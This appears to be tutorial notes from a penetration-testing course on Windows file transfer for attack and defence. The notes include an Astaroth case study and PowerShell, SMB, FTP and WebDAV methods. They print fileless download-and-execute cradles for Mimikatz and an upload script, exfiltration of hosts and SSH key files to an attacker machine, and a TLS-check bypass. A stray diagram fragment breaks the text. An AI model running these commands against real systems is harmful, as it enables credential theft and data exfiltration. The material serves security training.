## 1. Introduction

Every version of Windows ships with different built-in tools that can move files around. Knowing these tools matters for **both sides** of security:

- **Attackers** use them to move malicious tools onto a target, or steal data off it, while blending in with normal system activity.
- **Defenders** need to know how these tools work so they can monitor for misuse and write detection rules.

Think of it like knowing how locksmiths pick locks — not so you can break into houses, but so you can design better locks and notice when someone's trying to pick yours.

---

## 2. Why File Transfer Matters in Security

A real-world example used in the source material is Microsoft's write-up on the **Astaroth** malware — an advanced persistent threat (APT), meaning a sophisticated, sustained attack campaign rather than a quick smash-and-grab.

An important concept here is **"fileless" attacks**. The name is a bit misleading — it doesn't mean *no file is ever involved*. It means the final malicious payload doesn't sit on disk as an obvious file waiting to be scanned by antivirus. Instead, it's pulled into memory and run directly, using legitimate, pre-installed Windows tools as the delivery mechanism. Imagine a burglar not bringing their own tools, but using the homeowner's own kitchen knife left on the counter — nothing "suspicious" was brought in from outside.

---

## 3. Case Study: The Astaroth Attack

Here's the attack chain, step by step:

1. A phishing email contains a malicious link.
2. Clicking it downloads an **LNK file** (a Windows shortcut file).
3. Double-clicking the LNK file runs **WMIC** (Windows Management Instrumentation Command-line — a built-in admin tool) with a `/Format` option, which is abused to fetch and run malicious JavaScript.
4. That JavaScript downloads further payloads using **Bitsadmin** (a built-in Windows tool normally used for background file transfers, like Windows Update does).
5. The downloaded payloads are **base64-encoded** (a way of representing binary data as plain text) and get decoded using **Certutil** (a built-in certificate-management tool that can also decode base64 — a classic "dual-use" trick).
6. This produces several **DLL files** (Dynamic Link Libraries — reusable code modules Windows programs load at runtime).
7. **Regsvr32** (a tool meant to register DLLs with Windows) is abused to load one of these DLLs.
8. That DLL decrypts and loads further files, until the final Astaroth payload is injected into a legitimate system process called **Userinit**.

**Why this matters:** every single tool used here (WMIC, Bitsadmin, Certutil, Regsvr32) is a normal, trusted part of Windows. None of them are "hacking tools" by themselves. The attacker's skill was in chaining built-in tools together — a technique broadly called **"Living Off the Land"** (using what's already installed, rather than bringing in your own software that might get flagged).

## 4. Download Operations

Setup for this section: you (the attacker/learner) control a machine called **FOOT_HOLD** (the target) and another machine called **HACKER** (your attack box), and you want to move a file from HACKER onto FOOT_HOLD.

### 4.1 PowerShell Base64 Encode & Decode

If you don't want to use the network at all, you can convert a file into a long text string (base64), copy-paste that string between machines, and rebuild the file on the other end.

**Step 1 — Check the file's fingerprint before transfer.**
We use `md5sum`, a tool that creates a short fixed-length "fingerprint" (hash) of a file's contents. If the fingerprint matches before and after transfer, the file arrived intact — like a wax seal on a letter proving it wasn't tampered with.

```
$ md5sum id_rsa

4e301756a07ded0a2dd6953abf015278  id_rsa
```
*Calculates the MD5 hash of the `id_rsa` file on the attack box, to compare later.*

**Step 2 — Encode the file to base64 text.**
```
$ cat id_rsa |base64 -w 0;echo

LS0tL...<SNIP>...S0tLQo=
```
*`cat` reads the file, `base64` converts it into plain text (`-w 0` means "don't wrap the output into multiple lines"), and `echo` just adds a newline afterward for readability.*

**Step 3 — Paste and decode on the Windows target.**
```
PS C:\foot_hold> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS...<SNIP>...VktLS0tLQo="))
```
*This PowerShell line converts the base64 text back into raw bytes (`FromBase64String`) and writes those bytes out as a file (`WriteAllBytes`) at the given path.*

**Step 4 — Verify the fingerprint matches.**
```
Get-FileHash C:\Users\Public\id_rsa -Algorithm md5

Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
MD5             4E301756A07DED0A2DD6953ABF015278                                       C:\Users\Public\id_rsa
```
*`Get-FileHash` is PowerShell's equivalent of `md5sum` — it confirms the file wasn't corrupted during the copy-paste.*

> **Limitation to remember:** Windows' classic command prompt (`cmd.exe`) can only accept a string up to 8,191 characters long, so this trick only works for small files.

### 4.2 PowerShell Web Downloads

Most company firewalls allow normal web traffic (HTTP/HTTPS) out, because employees need the internet to do their jobs. That same "normal" traffic can be used to pull files onto a machine. Defenders can push back with web filtering (blocking categories of sites, blocking specific file extensions like `.exe`, or only allowing a safe-list of domains).

PowerShell's `System.Net.WebClient` class offers several ways to grab data from a URL:

| Method | What it does |
|---|---|
| `OpenRead` | Returns the remote data as a stream (like a continuous flow, not a finished file) |
| `OpenReadAsync` | Same, but doesn't freeze your terminal while it downloads |
| `DownloadData` | Downloads the raw bytes into memory |
| `DownloadDataAsync` | Same as above, without blocking the calling thread |
| `DownloadFile` | Downloads and saves directly to a file on disk |
| `DownloadFileAsync` | Same as above, without blocking the calling thread |
| `DownloadString` | Downloads and treats the result as text |
| `DownloadStringAsync` | Same as above, without blocking the calling thread |

**Downloading to a file:**
```
# Structure:
PS C:\foot_hold>: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')

# Example:
PS C:\foot_hold> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
```
*Creates a new `WebClient` object and calls `DownloadFile` with (source URL, destination path) to save the file to disk.*

```
# Structure:
PS C:\foot_hold> (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')

# Example:
PS C:\foot_hold> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
```
*Same idea, but asynchronous — the download happens in the background instead of freezing the terminal.*

**Fileless download ("run it, don't save it"):**
```
PS C:\foot_hold> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```
*`DownloadString` pulls the script's text straight into memory, and `IEX` (short for `Invoke-Expression`) immediately runs that text as a PowerShell command — the script is never saved to disk, which is the essence of a "fileless" technique.*

```
PS C:\foot_hold> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```
*Same result, just piping (`|`) the downloaded text into `IEX` instead of wrapping it.*

**Using Invoke-WebRequest (available from PowerShell 3.0+):**
```
PS C:\foot_hold> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```
*`-OutFile` tells it where to save the result. This cmdlet is more modern but slower than `WebClient`. Its common aliases are `iwr`, `curl`, and `wget` (note: these are NOT the real Linux `curl`/`wget` — just PowerShell nicknames for `Invoke-WebRequest`).*

`Harmj0y` has compiled an extensive list of PowerShell download cradles [here](https://gist.github.com/HarmJ0y/bb48307ffa663256e239). It is worth gaining familiarity with them and their nuances, such as a lack of proxy awareness or touching disk (downloading a file onto the target) to select the appropriate one for the situation.

### 4.3 Common PowerShell Errors

**Error 1 — Internet Explorer engine not configured:**
```
PS C:\foot_hold> Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX

Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.
```

<img width="707" height="445" alt="image" src="https://github.com/user-attachments/assets/5a35daaf-a41b-427e-9d0f-2df452ddbc54" />

*`Invoke-WebRequest` tries to use Internet Explorer's parsing engine behind the scenes. If IE has never been set up on that machine, it fails.*

**Fix:**
```
PS C:\foot_hold> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```
*`-UseBasicParsing` skips the IE engine entirely and does basic text parsing instead.*

**Error 2 — Untrusted SSL/TLS certificate:**
```
PS C:\foot_hold> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

Exception calling "DownloadString" with "1" argument(s): "The underlying connection was closed: Could not establish trust relationship for the SSL/TLS secure channel."
```
*This happens when the destination server's HTTPS certificate isn't trusted by the Windows machine (common with self-signed certs used in labs).*

**Fix (lab context only — this disables cert checking):**
```
PS C:\foot_hold> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```
*This tells PowerShell to accept any certificate as valid for the rest of the session — useful in a controlled lab, risky on a real network since it removes a security check.*

### 4.4 SMB Downloads

**SMB (Server Message Block)** is a protocol that runs over **TCP port 445** and is how Windows machines commonly share files and printers on a network. Think of it like a shared office filing cabinet that any authorized computer in the building can open.

To pull a file via SMB from your attack box, first stand up a fake SMB file-share server using Impacket's `smbserver.py`:

```
$ sudo impacket-smbserver share -smb2support /tmp/smbshare

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
```
*Starts an SMB server named `share`, serving the local folder `/tmp/smbshare`, with SMB2 protocol support enabled.*

**Copying a file from the share (anonymous/guest access):**
```
C:\foot_hold> copy \\192.168.220.133\share\nc.exe

        1 file(s) copied.
```
*Standard Windows `copy` command, but pointed at a network path (`\\server\share\file`) instead of a local path.*

**Newer Windows versions often block this by default:**
```
C:\foot_hold> copy \\192.168.220.133\share\nc.exe

You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.
```
*Modern Windows disables "guest" (no username/password) SMB access by default as a security hardening measure.*

**Workaround: add a username and password to the share:**
```
$ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```
*Same as before, but now requires credentials (`test`/`test`) to connect.*

```
C:\foot_hold> net use n: \\192.168.220.133\share /user:test test

The command completed successfully.
```
*`net use` maps the remote share to a local drive letter (`n:`), authenticating with the given username and password.*

```
C:\foot_hold> copy n:\nc.exe
        1 file(s) copied.
```
*Now you can copy from the share as if it were a local drive.*

### 4.5 FTP Downloads

**FTP (File Transfer Protocol)** uses **TCP ports 21 (control) and 20 (data)**. It's one of the oldest ways to move files between computers over a network.

**Setting up an FTP server on your attack box** using the Python module `pyftpdlib`:
```
$ sudo pip3 install pyftpdlib
```
*Installs the FTP server library.*

```
$ sudo python3 -m pyftpdlib --port 21

[I 2022-05-17 10:09:19] concurrency model: async
[I 2022-05-17 10:09:19] masquerade (NAT) address: None
[I 2022-05-17 10:09:19] passive ports: None
[I 2022-05-17 10:09:19] >>> starting FTP server on 0.0.0.0:21, pid=3210 <<<
```
*Runs the FTP server on port 21 (the library defaults to port 2121 otherwise). Note: with no username/password configured, anonymous login is allowed by default.*

**Downloading via PowerShell:**
```
PS C:\foot_hold> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```
*`WebClient` supports `ftp://` URLs too, not just `http(s)://`.*

**Downloading via the built-in FTP client (useful when you don't have an interactive shell):**
```
C:\foot_hold> echo open 192.168.49.128 > ftpcommand.txt
C:\foot_hold> echo USER anonymous >> ftpcommand.txt
C:\foot_hold> echo binary >> ftpcommand.txt
C:\foot_hold> echo GET file.txt >> ftpcommand.txt
C:\foot_hold> echo bye >> ftpcommand.txt
C:\foot_hold> ftp -v -n -s:ftpcommand.txt
```
*Instead of typing FTP commands interactively (which you can't do without an interactive shell), you write each command into a text file line by line, then run `ftp -s:filename` to execute them all in sequence: connect, log in anonymously, switch to binary transfer mode, download the file, then disconnect.*

```
ftp> open 192.168.49.128
Log in with USER and PASS first.
ftp> USER anonymous

ftp> GET file.txt
ftp> bye

C:\foot_hold>more file.txt
This is a test file
```
*Output showing the scripted session running and the downloaded file's contents being displayed with `more`.*

## 5. Upload Operations

Same tools as before, just reversed — now you're pulling a file **off** the target and onto your attack box. Common reasons: cracking stolen passwords offline, deeper analysis, or exfiltrating (stealing) data.

### 5.1 PowerShell Base64 Upload

**Encode the file into base64 text on the target, and grab its hash:**
```
PS C:\foot_hold> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))

IyBDb3B...<SNIP>...ob3N0DQo=
```
*`Get-Content -Encoding byte` reads the raw bytes of the file, and `ToBase64String` converts those bytes into text you can copy-paste.*

```
PS C:\foot_hold> Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash

Hash
----
3688374325B992DEF12793500307566D
```
*Gets the fingerprint of the original file so you can verify it later.*

**Decode on the attack box (Linux):**
```
$ echo IyBDb3B5c...<SNIP>...3N0DQo= | base64 -d > hosts
```
*`base64 -d` reverses the encoding, turning the text back into the original file, saved as `hosts`.*

```
$ md5sum hosts 

3688374325b992def12793500307566d  hosts
```
*Confirms the fingerprint matches (note: hashes are case-insensitive when comparing — `...66D` vs `...66d` is the same hash).*

### 5.2 PowerShell Web Uploads

PowerShell has no single built-in "upload" function, so this section builds one using `Invoke-WebRequest`/`Invoke-RestMethod` plus a receiving web server that's actually configured to accept uploads (most basic web servers only serve files, they don't accept them).

**Set up a Python web server that accepts uploads, using the `uploadserver` module:**
```
$ pip3 install uploadserver

Collecting upload server
  Using cached uploadserver-2.0.1-py3-none-any.whl (6.9 kB)
Installing collected packages: uploadserver
Successfully installed uploadserver-2.0.1
```
*Installs the extended HTTP server module.*

```
$ python3 -m uploadserver

File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
*Starts the server on port 8000 with an `/upload` endpoint ready to receive files.*

**Use a ready-made PowerShell script (`PSUpload.ps1`) to send the file:**
```
PS C:\foot_hold> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
PS C:\foot_hold> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts

[+] File Uploaded:  C:\Windows\System32\drivers\etc\hosts
[+] FileHash:  5E7241D66FD77E9E8EA866B6278B2373
```
The [PSUpload.ps1](https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1) script which uses `Invoke-RestMethod` to perform the upload operations. The script accepts two parameters `-File`, which we use to specify the file path, and `-Uri`, the server URL where we'll upload our file. 

*First line downloads and runs the script in memory (fileless), which defines a new `Invoke-FileUpload` command. Second line calls that command with the target server URL and the file to send; it reports success and the file's hash for verification.*

### 5.3 PowerShell Base64 Web Upload (with Netcat)

An alternative upload method using a plain **Netcat** listener (a simple tool that just listens on a network port and prints whatever it receives) instead of a proper upload server.

**On the target — encode the file and POST it:**
```
PS C:\foot_hold> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
PS C:\foot_hold> Invoke-WebRequest -Uri http://HACKER_IP:PORT/ -Method POST -Body $b64
```
*Encodes the file to base64 text, then sends it as the body of an HTTP POST request to the listener.*

**On the attack box — catch it with Netcat:**
```
$ nc -lvnp 8000

listening on [any] 8000 ...
connect to ...
POST / HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.1682
Content-Type: application/x-www-form-urlencoded
Content-Length: 1820
Connection: Keep-Alive

IyBDb3B5cmlnaHQgKGMpI...
```
*`nc -lvnp 8000` means: Listen, be Verbose, don't resolve hostnames (n), on Port 8000. You see the raw HTTP request including headers and the base64 payload at the bottom.*

**Decode the captured text back into a file:**
```
$ echo <base64> | base64 -d -w 0 > hosts
```
*Same decode trick as before — turn text back into bytes and save it.*

### 5.4 SMB Uploads (incl. WebDAV)

Organizations often block outbound SMB (TCP/445) traffic since it's unusual for normal employee work and raises the risk of attacks — but HTTP(S) outbound (ports 80/443) is almost always allowed. That's where **WebDAV** comes in.

**WebDAV** (Web Distributed Authoring and Versioning, RFC 4918) is an extension to regular HTTP that lets a plain web server act like a file server. Think of it as teaching a simple web server to also behave like a shared network drive.

Interesting behavior: Windows will first try connecting via SMB, and only fall back to HTTP/WebDAV if no SMB share is found — this was observed in Wireshark network capture.

**Set up a WebDAV server using `wsgidav` and `cheroot`:**
```
$ sudo pip3 install wsgidav cheroot
```
*Installs the WebDAV server library (`wsgidav`) and its underlying web server engine (`cheroot`).*

```
$ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 

Running without configuration file.
...
10:02:53.950 - WARNING : Basic authentication is enabled: It is highly recommended to enable SSL.
10:02:53.950 - WARNING : Share '/' will allow anonymous write access.
10:02:54.194 - INFO    : Serving on http://0.0.0.0:80 ...
```
*Runs the WebDAV server on all interfaces, port 80, serving the `/tmp` folder, with anonymous (no login) access allowed.*

**Connect from the Windows target using the special `DavWWWRoot` path:**
```
C:\foot_hold> dir \\192.168.49.128\DavWWWRoot

 Directory of \\192.168.49.128\DavWWWRoot

05/18/2022  10:05 AM    <DIR>          .
05/18/2022  10:05 AM    <DIR>          ..
05/18/2022  10:05 AM    <DIR>          sharefolder
05/18/2022  10:05 AM                13 filetest.txt
               1 File(s)             13 bytes
               3 Dir(s)  43,443,318,784 bytes free
```
*`DavWWWRoot` isn't a real folder — it's a special keyword Windows recognizes, telling its built-in "Mini-Redirector" driver to treat the connection as a WebDAV root.*

> **Tip:** If you point directly at a real folder name on the server (e.g. `\\192.168.49.128\sharefolder`) instead, you don't need the `DavWWWRoot` trick at all.

**Uploading files:**
```
C:\foot_hold> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
C:\foot_hold> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
```
*Plain Windows `copy` works exactly the same way over WebDAV as it does over real SMB — that's the whole point of WebDAV mimicking a file share.*

> **Note:** If outbound SMB (445) isn't actually blocked in your lab, you can skip WebDAV entirely and just use `impacket-smbserver` (same tool as in the download section) for uploads too.

### 5.5 FTP Uploads

Same `pyftpdlib` tool as before, but this time with the `--write` flag to allow clients to push files **to** the server (by default it's read-only):

```
$ sudo python3 -m pyftpdlib --port 21 --write

/usr/local/lib/python3.9/dist-packages/pyftpdlib/authorizers.py:243: RuntimeWarning: write permissions assigned to anonymous user.
  warnings.warn("write permissions assigned to anonymous user.",
[I 2022-05-18 10:33:31] >>> starting FTP server on 0.0.0.0:21, pid=5155 <<<
```
*The warning is the tool itself flagging that anonymous users can now write files — worth noting as a real security concern outside of a lab.*

**Uploading via PowerShell:**
```
PS C:\foot_hold> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```
*`UploadFile` is the upload counterpart to `DownloadFile` — (destination URL, local file to send).*

**Uploading via the built-in FTP client with a command file:**
```
C:\foot_hold> echo open 192.168.49.128 > ftpcommand.txt
C:\foot_hold> echo USER anonymous >> ftpcommand.txt
C:\foot_hold> echo binary >> ftpcommand.txt
C:\foot_hold> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
C:\foot_hold> echo bye >> ftpcommand.txt
C:\foot_hold> ftp -v -n -s:ftpcommand.txt
```
*Identical pattern to the download version, except the command is `PUT` (send a file to the server) instead of `GET` (fetch a file from the server).*

```
ftp> open 192.168.49.128

Log in with USER and PASS first.

ftp> USER anonymous
ftp> PUT c:\windows\system32\drivers\etc\hosts
ftp> bye
```
*Scripted session output: connect, log in anonymously, upload the file, disconnect.*

                      └────────────┬─────────────┘

                 │                                     │

                 │                                     │

     ┌────────────────────────┐          ┌───────────────────────────┐

## 7. Cheat Sheet

| Goal | Protocol | Key Command |
|---|---|---|
| Encode file to text | Local | `cat file \| base64 -w 0` (Linux) / `[Convert]::ToBase64String(...)` (PowerShell) |
| Decode text to file | Local | `base64 -d > file` (Linux) / `[IO.File]::WriteAllBytes(...)` (PowerShell) |
| Verify file integrity | Local | `md5sum file` (Linux) / `Get-FileHash file -Algorithm md5` (PowerShell) |
| Download a file over HTTP(S)/FTP | Web | `(New-Object Net.WebClient).DownloadFile(url, path)` |
| Download & run in memory (fileless) | Web | `IEX (New-Object Net.WebClient).DownloadString(url)` |
| Modern download cmdlet | Web | `Invoke-WebRequest url -OutFile path` (add `-UseBasicParsing` if IE isn't configured) |
| Bypass SSL trust errors (lab only) | Web | `[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}` |
| Start a rogue SMB server | SMB | `impacket-smbserver share -smb2support /path [-user U -password P]` |
| Map/copy from SMB share | SMB | `net use n: \\IP\share /user:U P` then `copy n:\file` |
| Start an FTP server | FTP | `python3 -m pyftpdlib --port 21 [--write]` |
| Download via FTP client (scripted) | FTP | `ftp -v -n -s:commandfile.txt` with `GET` in the file |

## 8. Big-Picture Takeaways

1. **Dual-use is everywhere.** Tools like PowerShell, Certutil, Bitsadmin, and `copy` aren't malicious by design — they're normal admin utilities that can be repurposed for attacks, which is exactly why "Living Off the Land" techniques are hard to detect.
2. **Fileless doesn't mean harmless.** Avoiding disk writes (via `IEX` + `DownloadString`) is a deliberate evasion technique aimed at antivirus and endpoint monitoring tools that primarily scan files, not memory.
3. **Protocol choice follows the path of least resistance.** HTTP/HTTPS is almost always allowed outbound because businesses need the web — which is exactly why it's the most commonly abused channel, and why WebDAV exists as an SMB-over-HTTP workaround.
4. **Always verify integrity after a transfer.** Hashing (MD5 here) confirms a file wasn't corrupted or tampered with mid-transfer — a habit worth building regardless of which method you use.
5. **Defenses evolve in response.** Modern Windows blocking anonymous SMB guest access is a direct response to these well-known techniques — meaning attackers (and students) constantly need fallback methods (like the username/password SMB server, or WebDAV).
6. **Small conveniences have real limits.** The base64/clipboard method is simple and leaves no network trace, but is capped by `cmd.exe`'s ~8,191 character limit — fine for SSH keys, not for large binaries.
